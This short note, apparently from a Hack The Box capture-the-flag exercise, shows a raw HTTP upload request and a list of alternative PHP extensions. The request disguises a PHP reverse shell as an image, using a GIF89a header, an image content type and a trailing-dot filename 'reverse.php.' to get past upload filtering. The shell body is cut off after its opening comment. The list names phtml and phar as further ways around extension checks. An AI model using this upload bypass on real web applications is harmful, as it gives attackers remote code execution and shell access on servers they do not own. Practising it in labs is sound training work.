
## Request Example
```http
POST /upload HTTP/1.1
Host: environment.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryQAiypsgIkS7OFGYf
Accept: */*

------WebKitFormBoundaryQAiypsgIkS7OFGYf
Content-Disposition: form-data; name="_token"

pLpk2VIh1LTAhZ3LumkAWHW7NdGHrySevDoomt5M
------WebKitFormBoundaryQAiypsgIkS7OFGYf
Content-Disposition: form-data; name="upload"; filename="reverse.php."
Content-Type: image/jpg

GIF89a <?php
// php-reverse-shell

```

## Weird php extensions
- phtml
- phar
 